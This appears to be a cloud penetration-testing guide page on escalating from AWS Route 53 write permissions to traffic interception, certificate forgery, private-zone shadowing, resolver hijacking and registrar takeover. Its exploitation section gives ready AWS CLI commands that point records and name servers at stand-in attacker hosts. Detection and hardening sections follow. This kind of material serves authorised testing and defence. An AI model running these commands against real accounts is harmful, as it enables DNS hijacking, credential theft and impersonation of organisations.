---
cstg_id: CSTG-AWS-ROUTE53-PRIVESC
title: "AWS Route53 - Privilege Escalation"
provider: aws
service: route53
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - route53:ChangeResourceRecordSets
  - route53:CreateHostedZone
  - route53:AssociateVPCWithHostedZone
  - route53resolver:CreateResolverRule
  - route53resolver:AssociateResolverRule
  - route53resolver:CreateResolverEndpoint
  - route53domains:UpdateDomainNameservers
  - acm:RequestCertificate
tools:
  - AWS CLI
  - AWS SDK
  - DNS resolver / dig
references:
  - https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html
  - https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/hosted-zones-private-associate-vpcs.html
  - https://docs.aws.amazon.com/acm/latest/userguide/dns-validation.html
  - https://hackingthe.cloud/aws/exploitation/route53/
  - https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resolver-rules-managing.html
license: CC BY-SA 4.0
---

## Summary

Route 53 rarely grants IAM privilege escalation in the classical sense (it issues no credentials and assumes no roles). Instead, control over DNS is a powerful *trust-manipulation* primitive that escalates an attacker's effective reach: whoever controls the answer a name resolves to controls where traffic, certificate validation, and identity tokens go. The escalation paths in this page convert a DNS write or zone-management permission into broader access - intercepting traffic and credentials, forging valid TLS certificates for victim domains, pivoting from a public to a private namespace, or hijacking a domain at the registrar.

These techniques matter because many higher-trust systems implicitly trust DNS: ACM and other CAs use DNS-based domain validation, mutual-TLS and OIDC discovery rely on hostnames, SSO and email integrations are bootstrapped via DNS, and service-to-service calls resolve internal names. A single `route53:ChangeResourceRecordSets` grant on the right zone can therefore be leveraged to obtain trusted certificates, redirect login flows, and impersonate services - effectively elevating from "can edit DNS" to "can impersonate the organisation."

## Prerequisites

- Assumed-breach foothold: valid credentials for a principal that holds one or more Route 53 / Resolver / Domains write permissions (see `required_permissions`). Enumerate the exact grants first - see [Route53 Enumeration](../02-services/aws-route53-enum.md) and the account-wide IAM privilege-escalation pages.
- Identification of high-value records: hostnames used for SSO/OIDC, ACM-validated certificates, email, internal APIs, or anything a victim or downstream system trusts.
- For private-zone pivots, the ability to reach (or influence routing into) the target VPC, or permission to associate a zone/VPC.
- For certificate forgery, a CA that performs DNS-based validation (ACM is in-account; public CAs are external) plus the ability to write the validation record.

## Enumeration

Confirm which write actions are actually authorised before attempting changes (dry-run reasoning via IAM policy simulation or by inspecting attached policies), and identify the most valuable zones and records:

```bash
# Which zones can be modified?
aws route53 list-hosted-zones --query "HostedZones[].{Id:Id,Name:Name,Private:Config.PrivateZone}"

# High-value records: SSO, login, api, autodiscover, ACM validation (_acme/_xxxx CNAME)
aws route53 list-resource-record-sets --hosted-zone-id Z0123456789ABCDEFGHIJ \
  --query "ResourceRecordSets[?Type=='CNAME' || Type=='A' || Type=='TXT'].{Name:Name,Type:Type,Value:ResourceRecords[].Value}"

# Existing ACM certs whose validation you could subvert / domains you could issue for
aws acm list-certificates --region us-east-1
aws acm describe-certificate --certificate-arn <arn> --region us-east-1
```

Use IAM policy simulation to validate intended actions without making changes:

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::111122223333:role/foothold \
  --action-names route53:ChangeResourceRecordSets route53:AssociateVPCWithHostedZone \
  --resource-arns arn:aws:route53:::hostedzone/Z0123456789ABCDEFGHIJ
```

## Misconfigurations & Findings

- **Broad `route53:ChangeResourceRecordSets` grants** (often via `route53:*` or wildcard resources) on production hosted zones held by non-DNS roles, CI/CD pipelines, or application instance profiles.
- **`acm:RequestCertificate` + DNS write in the same principal**, enabling self-service issuance of trusted certificates for any in-zone hostname.
- **`route53:AssociateVPCWithHostedZone` / `CreateHostedZone`** permitting an attacker to shadow or override a private namespace, or to attach a malicious zone to a victim VPC.
- **Resolver rule write permissions** (`route53resolver:CreateResolverRule`, `AssociateResolverRule`) that allow redirecting forwarded DNS queries for arbitrary domains to attacker-controlled name servers.
- **`route53domains:UpdateDomainNameservers`** on registered domains, enabling wholesale delegation of the domain to attacker name servers (full DNS hijack).

## Exploitation

### route53:ChangeResourceRecordSets

The core DNS-write primitive. `ChangeResourceRecordSets` upserts/deletes any record in a zone the principal can modify. Escalation uses fall into traffic redirection, credential interception, and certificate forgery.

**Redirect a trusted hostname to attacker infrastructure.** Repoint an `A`/`CNAME` (for example an internal API, an SSO assertion-consumer endpoint, an update server, or an OIDC discovery host) to attacker-controlled infrastructure to capture credentials, tokens, or sensitive requests, or to serve malicious responses.

```bash
cat > change.json <<'EOF'
{
  "Comment": "redirect",
  "Changes": [{
    "Action": "UPSERT",
    "ResourceRecordSet": {
      "Name": "login.example.com.",
      "Type": "A",
      "TTL": 60,
      "ResourceRecords": [{ "Value": "203.0.113.10" }]
    }
  }]
}
EOF
aws route53 change-resource-record-sets --hosted-zone-id Z0123456789ABCDEFGHIJ --change-batch file://change.json
```

A short TTL accelerates propagation and later cleanup. Combine with a TLS certificate the attacker controls for the same name (see ACM path below) to defeat HTTPS clients that only check certificate validity.

**Email / identity record manipulation.** Modifying `MX`, SPF/DKIM `TXT`, or `_dmarc` records can redirect inbound mail or weaken anti-spoofing to enable convincing phishing of internal users - a stepping stone to credential theft and onward escalation.

### acm:RequestCertificate (with DNS validation write)

AWS Certificate Manager validates domain ownership by asking the requester to create a specific `CNAME` record in the domain. A principal that can both request a certificate and write the validation record can mint a *publicly trusted, AWS-integrated* certificate for any hostname in a controlled zone - even for names it does not legitimately operate.

```bash
# 1. Request a cert for a victim hostname
aws acm request-certificate --domain-name app.example.com \
  --validation-method DNS --region us-east-1

# 2. Read the DNS validation CNAME ACM expects
aws acm describe-certificate --certificate-arn <arn> --region us-east-1 \
  --query "Certificate.DomainValidationOptions[].ResourceRecord"

# 3. Write that CNAME into the zone you control
aws route53 change-resource-record-sets --hosted-zone-id Z0123456789ABCDEFGHIJ \
  --change-batch file://acm-validation.json
```

The issued certificate can then be bound to attacker-controlled CloudFront/ALB/API Gateway resources, making a redirected hostname indistinguishable from the legitimate service to TLS-validating clients. The same DNS-write capability also enables fulfilling external ACME (`_acme-challenge` `TXT`) challenges for other CAs.

### route53:AssociateVPCWithHostedZone / route53:CreateHostedZone

**Private-zone shadowing / override.** With `CreateHostedZone` plus `AssociateVPCWithHostedZone`, an attacker can create a private hosted zone for an existing internal name (or a more specific subdomain) and associate it with a victim VPC. Route 53 Resolver answers from the most specific associated private zone, so the attacker's records take precedence for in-VPC resolution - silently redirecting internal service-to-service traffic without touching the legitimate zone.

```bash
aws route53 create-hosted-zone --name internal.corp.example. \
  --vpc VPCRegion=us-east-1,VPCId=vpc-0victim123 \
  --caller-reference "$(date +%s)"

# Or associate an attacker zone with an additional victim VPC
aws route53 associate-vpc-with-hosted-zone --hosted-zone-id Z0ATTACKERZONE \
  --vpc VPCRegion=us-east-1,VPCId=vpc-0victim123
```

Cross-account association requires an authorization on the zone owner side, but in-account this is a direct override. This converts DNS-management permissions into an internal man-in-the-middle position.

### route53resolver:CreateResolverRule / AssociateResolverRule

Resolver forwarding rules control where VPC DNS queries for a given domain are sent. An attacker who can create and associate a forwarding rule can redirect resolution of an arbitrary domain (including external domains the organisation trusts) to attacker-operated name servers, capturing or rewriting answers for the whole VPC.

```bash
aws route53resolver create-resolver-rule --region us-east-1 \
  --name hijack --rule-type FORWARD --domain-name partner-api.example.net \
  --resolver-endpoint-id rslvr-out-0abc123 \
  --target-ips Ip=203.0.113.53,Port=53

aws route53resolver associate-resolver-rule --region us-east-1 \
  --resolver-rule-id rslvr-rr-0def456 --vpc-id vpc-0victim123
```

### route53domains:UpdateDomainNameservers

The registrar-level nuclear option. Changing the authoritative name servers for a registered domain delegates the *entire* domain away from Route 53 to attacker-controlled name servers, giving the attacker total control of every record - and the ability to issue certificates, intercept mail, and impersonate all services under that domain.

```bash
aws route53domains update-domain-nameservers --region us-east-1 \
  --domain-name example.com \
  --nameservers Name=ns1.attacker.example Name=ns2.attacker.example
```

This is highly disruptive and noisy; it is included for completeness as the highest-impact DNS escalation.

## Detection & Logging

All of these actions are recorded by **CloudTrail** (global Route 53 events delivered to `us-east-1`):

- `ChangeResourceRecordSets` - inspect the `requestParameters.changeBatch` to see exactly which records and values were written; alert on changes to login/SSO/api/MX/`_dmarc`/`_acme-challenge` names, on very low TTLs, and on changes from principals that are not the established DNS-management identity.
- `CreateHostedZone`, `AssociateVPCWithHostedZone`, `DisassociateVPCFromHostedZone` - alert on new private zones for names that overlap existing internal namespaces, and on associations to production VPCs.
- `route53resolver:CreateResolverRule` / `AssociateResolverRule` / `CreateResolverEndpoint` - alert on new forwarding rules targeting external IPs.
- `route53domains:UpdateDomainNameservers`, `UpdateDomainContact`, `DisableDomainTransferLock` - treat as critical.
- `acm:RequestCertificate` immediately followed by a Route 53 `ChangeResourceRecordSets` for a matching `_xxxx` validation `CNAME` is a strong forged-certificate signal; corroborate with Certificate Transparency log monitoring for unexpected issuance.

## Remediation & Hardening

- Least privilege on DNS writes: restrict `route53:ChangeResourceRecordSets` to specific hosted-zone ARNs and to dedicated DNS-management roles; never attach broad `route53:*` to application or CI roles.
- Separate certificate issuance authority from DNS-write authority where possible, and monitor ACM issuance against Certificate Transparency.
- Restrict and review `CreateHostedZone`, `AssociateVPCWithHostedZone`, and all `route53resolver` write actions; require change control for resolver forwarding rules.
- Protect the registrar: enable domain transfer lock, restrict `route53domains:*` to a small set of administrators, and alert on any name-server or contact change.
- Use SCPs/permission boundaries to deny DNS and registrar mutations outside approved roles and pipelines.
- Enforce strong, monitored DNS query logging and CloudTrail coverage in `us-east-1`; alert on the high-risk events above.

## Tools

- AWS CLI (`aws route53`, `aws route53resolver`, `aws route53domains`, `aws acm`) and AWS SDKs.
- IAM policy simulation tooling to confirm authorised write actions without making changes.
- Certificate Transparency log monitors and DNS resolution tooling (`dig`) to validate impact.

## References

- ChangeResourceRecordSets API: https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html
- Associating VPCs with private hosted zones: https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/hosted-zones-private-associate-vpcs.html
- ACM DNS validation: https://docs.aws.amazon.com/acm/latest/userguide/dns-validation.html
- Managing Resolver rules: https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resolver-rules-managing.html
- Hacking the Cloud - Route 53: https://hackingthe.cloud/aws/exploitation/route53/
